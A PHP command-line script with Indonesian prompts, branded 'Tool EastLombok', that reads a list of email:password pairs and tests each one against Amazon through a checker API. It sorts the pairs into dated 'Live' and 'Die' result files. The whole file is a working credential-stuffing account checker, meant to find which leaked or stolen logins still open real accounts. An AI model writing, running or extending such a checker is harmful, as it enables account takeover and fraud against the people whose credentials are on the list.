<?php

require_once 'vendor/autoload.php';
require_once 'client.php';

$cli = new League\CLImate\CLImate;


$cli->draw('fancy-bender');
$cli->br();
$mode = $cli->confirm(" apakah mau menggunakan mode default");
if ($mode->confirmed()) {
	$namaFile = "empas.txt";
	$token = file_get_contents("token.txt");
	$checker = "amazon";
	$namaOutputLive = "Rasult/".date('Y-m-d').'-Live-Amazon.txt';
	$namaOutputDie = "Rasult/".date('Y-m-d').'-Die-Amazon.txt';
}else{

	$namaFile = $cli->input(" masukkan nama file gayn :")->prompt();
	$cli->br();
	$token = $cli->input(" masukkan token :")->prompt();
	$cli->br();
	$checker = "amazon";
	$namaOutputLive = "Rasult/".date('Y-m-d').'-Live-Amazon.txt';
	$namaOutputDie = "Rasult/".date('Y-m-d').'-Die-Amazon.txt';
}
$inputHapus = $cli->confirm(" Clear Rasult Sebelumnya ($namaOutputLive) y/n :");
if ($inputHapus->confirmed()) {
		file_put_contents("$namaOutputLive", "");
	}
$cli->br();

$berhitung = count(file($namaFile)); 
echo "================Tool EastLombok===============\n=====created by: sayidina ahmadal qoqosyi=====\n\n";
echo "Nama File: ". $namaFile."\r\n";
echo "jumlah empas :".$berhitung."\r\n";
echo "Tekan CTRL + C kalau mau keluar \r\n";
echo "Proccessing wait... \r\n";
$cli->br();
tulis("copret", null, $namaOutputLive);

$fileopen = fopen($namaFile, 'rb');
for ($s=1; $s <= $berhitung ; $s++) { 
	$hitung = $berhitung - $s;
	$string = fgets($fileopen);
	$str = strtok($string, "\r\n");
	$data  = explode(":", $str);
	$email = $data[0];
	$password = $data[1]; 

	// connect to api
	$call = checker($email, $password, $token);
	if ($call["msg"] == "api key is wrong") {
		$cli->lightRed()->out("[401] Api key is wrong\n");
	}else if( $call["msg"] == "something wrong, check endpoint!" ){
		$cli->lightRed()->out("[401] Something Wrong, Check Endpoint Api!\n");
	}else if($call["msg"] == "ok"){
		if ($call["data"]["status"] == "Live") {
			$cli->lightGreen()->out("[".$hitung."] Live: " . $email);
			tulis("live", $data, $namaOutputLive);
		}else{
			$cli->lightRed()->out("[".$hitung."] Die: " . $email);
			tulis("die", $data, $namaOutputDie);
		}
	}
}
fclose($fileopen);